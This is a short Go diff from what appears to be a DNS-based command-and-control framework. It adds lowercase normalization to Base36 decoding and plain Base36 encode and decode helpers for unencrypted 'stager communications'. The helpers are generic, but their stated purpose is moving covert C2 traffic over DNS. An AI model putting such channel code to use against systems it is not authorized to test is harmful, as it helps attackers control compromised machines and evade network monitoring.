@@ -120,6 +120,9 @@ func encryptAndEncode(data string, key []byte) (string, error) {
 // decodeAndDecrypt combines Base36 decoding with AES-GCM decryption
 // to extract plaintext data from DNS-transmitted C2 communications.
 func decodeAndDecrypt(encoded string, key []byte) (string, error) {
+	// DNS is case-insensitive, so normalize to lowercase
+	encoded = strings.ToLower(encoded)
+
 	// Decode from base36
 	encrypted, err := base36Decode(encoded)
 	if err != nil {
@@ -133,6 +136,24 @@ func decodeAndDecrypt(encoded string, key []byte) (string, error) {
 	}
 
 	return string(decrypted), nil
+}
+
+// base36EncodeString encodes a plain string to base36 (no encryption)
+// Used for stager communications where encryption is not needed
+func base36EncodeString(data string) string {
+	return base36Encode([]byte(data))
+}
+
+// base36DecodeString decodes a base36 string to plain text (no decryption)
+// Used for stager communications where encryption is not needed
+func base36DecodeString(encoded string) (string, error) {
+	// DNS is case-insensitive, so normalize to lowercase
+	encoded = strings.ToLower(encoded)
+	decoded, err := base36Decode(encoded)
+	if err != nil {
+		return "", err
+	}
+	return string(decoded), nil
 }
 
 // Legacy functions for backward compatibility during transition
